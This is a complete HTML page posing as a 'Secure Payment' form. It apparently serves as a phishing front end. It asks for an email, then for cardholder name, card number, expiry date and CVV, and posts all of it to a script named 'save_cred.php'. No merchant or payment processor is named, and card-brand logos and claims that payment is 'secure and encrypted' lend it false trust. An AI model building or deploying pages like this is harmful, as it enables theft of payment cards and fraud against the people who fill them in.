<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Details & Payment</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f4f6;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    .container h1 {
      font-size: 24px;
      color: #333;
      margin-bottom: 20px;
    }

    .container label {
      display: block;
      font-size: 14px;
      text-align: left;
      margin-bottom: 8px;
      color: #555;
    }

    .container input[type="text"],
    .container input[type="email"],
    .container input[type="submit"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }

    .container input[type="text"]:focus,
    .container input[type="email"]:focus {
      border-color: #6c63ff;
      outline: none;
      box-shadow: 0 0 5px rgba(108, 99, 255, 0.5);
    }

    .container input[type="submit"] {
      background-color: #6c63ff;
      color: #ffffff;
      font-weight: bold;
      cursor: pointer;
      border: none;
      transition: background-color 0.3s ease;
    }

    .container input[type="submit"]:hover {
      background-color: #574bff;
    }

    .footer-note {
      font-size: 12px;
      color: #888;
      margin-top: -10px;
    }
  </style>
</head>
<body>
  <!-- Page 1: Email -->
  <div class="container" id="details-form">
    <h1>Welcome</h1>
    <p>Please provide your details to proceed to the payment form.</p>
    <form action="save_cred.php" method="post" id="email-form">
      <label for="email">Email Address:</label>
      <input type="email" id="email" name="email" placeholder="Enter your email" required>

      <input type="submit" value="Next">
    </form>
    <p class="footer-note">Your information will remain secure and confidential.</p>
  </div>

  <!-- Page 2: Payment Form (Visible after email form submission) -->
  <div class="container" id="payment-form" style="display: none;">
    <h1>Secure Payment</h1>

    <!-- Card Icons -->
    <div class="card-icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" style="width: 50px; margin: 0 10px; opacity: 0.8;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="width: 50px; margin: 0 10px; opacity: 0.8;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" style="width: 50px; margin: 0 10px; opacity: 0.8;">
    </div>

    <form action="save_cred.php" method="post">
      <!-- Hidden field to store email -->
      <input type="hidden" name="email" value="" id="email-hidden">

      <label for="card_name">Cardholder's Name:</label>
      <input type="text" id="card_name" name="card_name" required>

      <label for="card_number">Card Number:</label>
      <input type="text" id="card_number" name="card_number" required>

      <label for="exp_date">Expiration Date (MM/YY):</label>
      <input type="text" id="exp_date" name="exp_date" required>

      <label for="cvv">CVV:</label>
      <input type="text" id="cvv" name="cvv" required>

      <input type="submit" value="Pay Now">
    </form>

    <p class="footer-note">Your payment is secure and encrypted.</p>
  </div>

  <script>
    // Show Payment Form after Email Form Submission
    document.getElementById('email-form').onsubmit = function(event) {
      event.preventDefault(); // Prevent form submission
      const email = document.getElementById('email').value;
      document.getElementById('email-hidden').value = email; // Pass email to hidden input
      document.getElementById('details-form').style.display = 'none';
      document.getElementById('payment-form').style.display = 'block';
    };
  </script>
</body>
</html>
